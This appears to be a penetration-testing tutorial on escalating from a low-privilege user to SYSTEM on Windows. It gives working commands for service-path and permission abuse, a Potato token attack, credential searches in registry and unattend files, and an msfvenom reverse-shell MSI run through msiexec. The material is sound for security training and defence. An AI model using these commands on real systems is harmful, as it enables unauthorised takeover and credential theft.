# Windows Privilege Escalation

Getting a foothold on a Windows box is one thing. Getting SYSTEM is another. This post covers the most reliable paths from low-privilege user to SYSTEM or local admin, and how to enumerate your way to finding them.

---

## The Goal

On Windows, you're typically trying to reach one of two targets: SYSTEM (the highest privilege account, used by the OS itself) or a local Administrator. From there you can dump credentials, move laterally, or accomplish whatever objective brought you here.

As with Linux, misconfiguration is almost always the path. Patched, well-maintained Windows environments are hard to escalate on through exploits alone. But misconfigured services, weak permissions, and forgotten credentials are everywhere.

---

## Enumeration

Start with these before anything else.

### User and privilege context

```cmd
whoami
whoami /all
```

`whoami /all` is the most important command here. It shows your group memberships and, critically, your token privileges. Look for `SeImpersonatePrivilege`, `SeAssignPrimaryTokenPrivilege`, `SeDebugPrivilege`, and `SeLoadDriverPrivilege`.

```cmd
net user %username%
net localgroup administrators
```

### System information

```cmd
systeminfo
```

This dumps OS version, hostname, installed hotfixes, and network configuration. The hotfix list tells you what patches are missing, which is important for kernel exploit research.

```cmd
wmic qfe list brief
```

`wmic qfe` gives you the same patch list in a slightly cleaner format.

### Running processes and services

```cmd
tasklist /v
sc query type= all
wmic service list brief
```

Look for third-party services, services running as SYSTEM with unusual names, and services whose binary paths look non-standard.

```cmd
netstat -ano
```

Note any services listening on localhost that aren't exposed externally.

### Installed software

```cmd
wmic product get name,version
```

Or look in the registry:

```cmd
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall
```

### Automated tools

| Tool | Notes |
|------|-------|
| [WinPEAS](https://github.com/carlospolop/PEASS-ng) | The Windows equivalent of LinPEAS. Run it and read the output carefully. |
| [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) | PowerShell script focused specifically on privilege escalation vectors. |
| [Seatbelt](https://github.com/GhostPack/Seatbelt) | C# tool from GhostPack. Thorough host enumeration, useful for both red team and defenders. |

Run WinPEAS first. It covers most of the vectors described below automatically.

---

## Unquoted Service Paths

This is one of the most common findings in Windows environments and is surprisingly easy to miss during hardening reviews.

When Windows starts a service, it needs to locate the binary. If the path to the binary contains spaces and isn't enclosed in quotes, Windows tries multiple interpretations of the path in sequence.

For a service with the binary path:

```
C:\Program Files\My App\Service\myservice.exe
```

Windows will try, in order:

```
C:\Program.exe
C:\Program Files\My.exe
C:\Program Files\My App\Service.exe
C:\Program Files\My App\Service\myservice.exe
```

If you can write to `C:\` or `C:\Program Files\`, you can place a malicious binary at one of those earlier paths, and it gets executed as SYSTEM when the service starts.

Check for vulnerable services:

```cmd
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```

Or use `sc qc <servicename>` to inspect a specific service's configuration:

```cmd
sc qc "Vulnerable Service Name"
```

Look for `BINARY_PATH_NAME` values with spaces and no quotes.

---

## Weak Service Permissions

Even when paths are properly quoted, the binary itself might be writable by your current user. If you can overwrite the binary that a SYSTEM service executes, you own SYSTEM.

Use `accesschk.exe` from Sysinternals to check service binary permissions:

```cmd
accesschk.exe -uwcv Everyone *
accesschk.exe -uwcv "Users" *
```

If you can write to the service binary, replace it with your payload (a reverse shell, a user-adding command, whatever you need), then restart the service:

```cmd
sc stop "VulnerableService"
sc start "VulnerableService"
```

You can also check whether you have permission to change a service's configuration directly:

```cmd
accesschk.exe -ucqv "VulnerableService"
```

If you have `SERVICE_CHANGE_CONFIG` or `SERVICE_ALL_ACCESS`, you can redirect the binary path:

```cmd
sc config "VulnerableService" binpath= "C:\Users\lowpriv\Desktop\shell.exe"
sc start "VulnerableService"
```

---

## AlwaysInstallElevated

This policy, when enabled, allows MSI installer packages to run with SYSTEM privileges regardless of who is running them. It requires two registry keys to both be set:

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

If both return `0x1`, generate a malicious MSI with msfvenom:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f msi -o evil.msi
```

Transfer it to the target and run it:

```cmd
msiexec /quiet /qn /i evil.msi
```

The install runs as SYSTEM, your shell pops as SYSTEM.

---

## DLL Hijacking

When a Windows application loads a DLL, it searches a set of directories in a specific order. If the application doesn't specify a full path to the DLL, Windows searches:

1. The directory containing the application
2. The System32 directory
3. The 16-bit system directory
4. The Windows directory
5. The current directory
6. Directories listed in the `PATH` environment variable

If a DLL that an application is trying to load doesn't exist, and one of those search paths is writable by you, you can place a malicious DLL there and it gets loaded by the application.

The practical way to find these: run [Process Monitor](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon) (if you have GUI access) and filter for `Result = NAME NOT FOUND` combined with `Path ends with .dll`. That shows every DLL load that failed. Then check whether you have write access to any of the directories in the search path.

Without GUI access, look for applications with writable directories in their installation folder and cross-reference with known DLL search-order hijacking opportunities.

---

## Token Impersonation

This is one of the most reliable escalation paths when you're running as a service account.

### The privileges to look for

`whoami /priv` output showing `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege` is basically a green light. These privileges allow a process to impersonate another user's security token, including a SYSTEM token.

IIS, SQL Server, and other Windows services commonly run under accounts that have `SeImpersonatePrivilege` by design. When you get code execution through a web vulnerability on an IIS server, you'll frequently land with this privilege available.

### Potato attacks

The "Potato" family of attacks all abuse token impersonation in different ways depending on the Windows version:

| Tool | Works on |
|------|---------|
| [JuicyPotato](https://github.com/ohpe/juicy-potato) | Windows 10 prior to 1809, Server 2019 |
| [RoguePotato](https://github.com/antonioCoco/RoguePotato) | Windows 10 1809+, Server 2019+ |
| [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) | Windows 10 and Server 2016/2019 |
| [GodPotato](https://github.com/BeichenDream/GodPotato) | Windows Server 2012 through 2022 |

PrintSpoofer is clean and reliable on modern systems:

```cmd
PrintSpoofer.exe -i -c cmd
```

All of these work by coercing SYSTEM to authenticate to an endpoint you control, then stealing the resulting SYSTEM token.

---

## Stored Credentials

Credentials are stored in more places than most people expect.

### cmdkey

```cmd
cmdkey /list
```

This shows saved credentials in the Windows Credential Manager. If you see domain or server credentials stored here, you can use `runas /savecred` to execute commands using them:

```cmd
runas /savecred /user:DOMAIN\admin "cmd.exe /c whoami > C:\output.txt"
```

### Unattend files

Automated Windows installations leave behind configuration files that sometimes contain plaintext or base64-encoded credentials:

```
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\sysprep\sysprep.xml
C:\Windows\system32\sysprep\sysprep.xml
```

```cmd
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

### AutoLogon credentials in the registry

```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

Look for `DefaultUserName`, `DefaultPassword`, and `DefaultDomainName`. These are credentials used for automatic login and are stored in plaintext.

### Other registry locations

```cmd
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

Broad searches like this generate noise but occasionally surface something useful.

---

## Scheduled Tasks

Scheduled tasks are Windows' equivalent of cron jobs. Tasks running as SYSTEM or Administrator are interesting if their binary is writable by you.

Enumerate tasks:

```cmd
schtasks /query /fo LIST /v
```

The output is verbose. Look for tasks with `Run As User: SYSTEM` or an admin account, then check whether the binary path is writable:

```cmd
icacls "C:\path\to\task\binary.exe"
```

If you have write access, replace the binary with your payload.

---

## Kernel and Patch Exploits

When nothing else works, check what patches are missing.

```cmd
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

Some notable privilege escalation CVEs:

| CVE | Name | Description |
|-----|------|-------------|
| MS16-032 | Secondary Logon Service | Race condition in the secondary logon service. Works on most Windows versions pre-2016. |
| MS14-058 | Win32k.sys | Kernel-mode driver vulnerability. Old but still appears on ancient systems. |
| CVE-2021-1675 | PrintNightmare | Remote code execution via Windows Print Spooler. Also works locally. |
| CVE-2020-0787 | BITS | Background Intelligent Transfer Service privilege escalation. |

[Windows Exploit Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester) automates the matching:

```bash
# On your local machine:
python windows-exploit-suggester.py --update
python windows-exploit-suggester.py --database 2024-01-01-mssb.xls --systeminfo systeminfo.txt
```

The same caveat as Linux: kernel exploits can cause instability. In a live environment, treat them as last resort. In practice, unquoted service paths, token impersonation, or stored credentials resolve the vast majority of Windows escalation scenarios without touching the kernel.

---

## Methodology Summary

Work through this in order:

1. `whoami /all` and look for exploitable privileges (SeImpersonate, SeDebug)
2. `sudo -l` equivalent: `net localgroup administrators`, check if you're already closer to admin than you thought
3. WinPEAS, read the full output
4. Unquoted service paths
5. Weak service binary/config permissions
6. AlwaysInstallElevated (two-second registry check)
7. Stored credentials: cmdkey, unattend files, AutoLogon registry keys
8. Scheduled tasks with writable binaries
9. DLL hijacking
10. Kernel exploits as a last resort

The quickest win, by far, is usually SeImpersonatePrivilege plus a Potato attack, or a misconfigured service. Check those first.
